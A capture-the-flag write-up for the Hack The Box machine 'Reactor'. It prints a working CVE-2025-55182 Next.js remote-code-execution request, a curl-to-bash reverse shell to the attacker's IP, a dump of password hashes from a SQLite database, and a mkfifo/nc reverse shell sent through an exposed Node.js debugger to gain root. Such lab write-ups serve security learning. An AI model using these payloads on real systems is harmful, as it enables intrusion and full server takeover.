# Reactor Linux Easy HTB Machine Writeup

#cve-2025-55182 
## Nmap Emuneration
```shell
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sV 10.129.11.8 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-25 15:22 +0700
Nmap scan report for 10.129.11.8
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=6/25%Time=6A3CE585%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Ro
SF:uter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefet
SF:ch,\x20Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:
SF:\x201\r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.j
SF:s\r\nCache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd
SF:8t\"\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x2017175\r\nDate:\x20Thu,\x2025\x20Jun\x202026\x2008:23:43\x20GMT\r\nC
SF:onnection:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head
SF:><meta\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"wi
SF:dth=device-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20
SF:href=\"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"n
SF:ext\"/><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low
SF:\"\x20href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><scri
SF:pt\x20src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20asy
SF:nc=\"\"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04d
SF:ead1\.js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTT
SF:POptions,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Ne
SF:xt-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-P
SF:refetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private
SF:,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x
SF:20Thu,\x2025\x20Jun\x202026\x2008:23:45\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary
SF::\x20RSC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-R
SF:outer-Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Cont
SF:rol:\x20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revali
SF:date\r\nDate:\x20Thu,\x2025\x20Jun\x202026\x2008:23:46\x20GMT\r\nConnec
SF:tion:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.76 seconds

```
## Web Exploiting
### Confirming CVE-2025-55182
Using Burp Suite:
```
POST / HTTP/1.1
Host: 10.129.11.8:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```
Got:
```
HTTP/1.1 500 Internal Server Error
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
x-nextjs-cache: HIT
x-nextjs-prerender: 1
X-Powered-By: Next.js
Content-Type: text/x-component
Date: Thu, 25 Jun 2026 09:47:34 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 110

0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
1:E{"digest":"uid=999(node) gid=988(node) groups=988(node)"}
```
### Gaining reverse shell
`shell.sh`:
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.11/4444 0>&1
```
Run web server:
```bash
python3 -m http.server 80
```
Sent request:
```json
"_prefix": "var res=process.mainModule.require('child_process').execSync('curl http://10.10.15.11/shell.sh | bash').toString();throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"
```
## Get user flag
`node` folder doesn't have anything, saw a `reactor.db` of the website, using `sqlite3` to see what it has:
```bash
node@reactor:/opt/reactor-app$ which sqlite3
which sqlite3
/usr/bin/sqlite3
node@reactor:/opt/reactor-app$ ls
ls
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
node@reactor:/opt/reactor-app$ sqlite3 ./reactor.db
sqlite3 ./reactor.db
.tables
sensor_logs  users      
SELECT * FROM users
;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
.exit
node@reactor:/opt/reactor-app$ 
```
![[Pasted image 20260625170827.png]]
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/reactor]
└─$ ssh engineer@10.129.11.8
engineer@10.129.11.8's password: 
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Thu Jun 25 10:08:41 2026 from 10.10.15.11
engineer@reactor:~$ ls
user.txt
engineer@reactor:~$ cat user.txt
377eb3cdd303c2580d74eebb916b1b7c
engineer@reactor:~$ 
```
## Checking for priviledge escalation choices
```bash
engineer@reactor:~$ sudo -l
[sudo] password for engineer: 
Sorry, user engineer may not run sudo on reactor.
engineer@reactor:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
engineer@reactor:~$ /usr/bin/su
Password: 
su: Authentication failure
engineer@reactor:~$ /usr/bin/su
Password: 
su: Authentication failure
engineer@reactor:~$ ss -tulnp
Netid State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process 
udp   UNCONN  0       0           127.0.0.54:53          0.0.0.0:*            
udp   UNCONN  0       0        127.0.0.53%lo:53          0.0.0.0:*            
udp   UNCONN  0       0              0.0.0.0:68          0.0.0.0:*            
tcp   LISTEN  0       4096        127.0.0.54:53          0.0.0.0:*            
tcp   LISTEN  0       4096           0.0.0.0:22          0.0.0.0:*            
tcp   LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*            
tcp   LISTEN  0       511          127.0.0.1:9229        0.0.0.0:*            
tcp   LISTEN  0       4096              [::]:22             [::]:*            
tcp   LISTEN  28      511                  *:3000              *:*            
engineer@reactor:~$ 
```
Found the suspicious `127.0.0.1:9229`, after some investigating this is a `Node.js` debugger, forward the port to our machine for further exploit:
```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.11.8
```
## Get root flag
Check for the debugger websocker debugger url:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/reactor]
└─$ curl http://localhost:9229/json/list
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=localhost:9229/af849846-3099-4a22-ad70-30cf37cae16a",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=localhost:9229/af849846-3099-4a22-ad70-30cf37cae16a",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "af849846-3099-4a22-ad70-30cf37cae16a",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://localhost:9229/af849846-3099-4a22-ad70-30cf37cae16a"
} ]
```
Construct the payload to get reverse shell from the debugger:
```
{"id":2,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require(\"child_process\").execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.11 4444 >/tmp/f\").toString()"}}
```
Connect using `wscat` and sent the payload to the listener:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/reactor]
└─$ wscat --connect ws://localhost:9229/af849846-3099-4a22-ad70-30cf37cae16a
Connected (press CTRL+C to quit)
> {"id":2,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require(\"child_process\").execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.11 4444 >/tmp/f\").toString()"}}
> 
> 
```
Get root flag:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/reactor]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.11.8] 53596
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib64
lib.usr-is-merged
lost+found
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
snap
srv
sys
tmp
usr
var
# cat /root/root.txt
1c0ca4398cc10309e24f7a1bdbdcb8ad
# 
```

Lab Achievement: https://labs.hackthebox.com/achievement/machine/2924947/900
